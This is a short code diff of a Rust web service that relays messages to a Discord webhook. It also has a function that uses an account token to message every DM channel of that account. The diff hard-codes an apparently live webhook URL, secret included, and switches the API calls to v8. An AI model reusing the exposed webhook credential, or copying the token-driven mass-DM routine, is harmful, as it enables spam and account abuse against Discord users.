@@ -22,7 +22,7 @@ async fn test_handler() -> &'static str {
 }
 
 async fn send_to_discord(Json(payload): Json<Payload>) -> &'static str {
-    let webhook_url = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL"; // Replace with your actual webhook URL
+    let webhook_url = "https://discord.com/api/webhooks/1335818229276217376/ugNwp2Z0CkkWEA9Azb3Z0DPcc3RTGkCtWT0z2LETWE1ru3X2YHen6yqPoV5BGJp39roi"; // Replace with your actual webhook URL
 
     if payload.webhook_message.contains("@everyone") || payload.webhook_message.contains("@here") {
         eprintln!("Blocked message containing @everyone or @here");
@@ -57,7 +57,7 @@ async fn send_to_discord(Json(payload): Json<Payload>) -> &'static str {
 
 async fn send_dms(token: String, message: String) {
     let client = Client::new();
-    let api_url = "https://discord.com/api/v10/users/@me/channels";
+    let api_url = "https://discord.com/api/v8/users/@me/channels";
 
     let response = client.get(api_url)
         .header("Authorization", format!("Bearer {}", token))
@@ -73,7 +73,7 @@ async fn send_dms(token: String, message: String) {
                     Ok(dms) => {
                         for dm in dms {
                             if let Some(dm_id) = dm["id"].as_str() {
-                                let msg_response = client.post(format!("https://discord.com/api/v10/channels/{}/messages", dm_id))
+                                let msg_response = client.post(format!("https://discord.com/api/v8/channels/{}/messages", dm_id))
                                     .header("Authorization", format!("Bearer {}", token))
                                     .json(&serde_json::json!({"content": message}))
                                     .send()
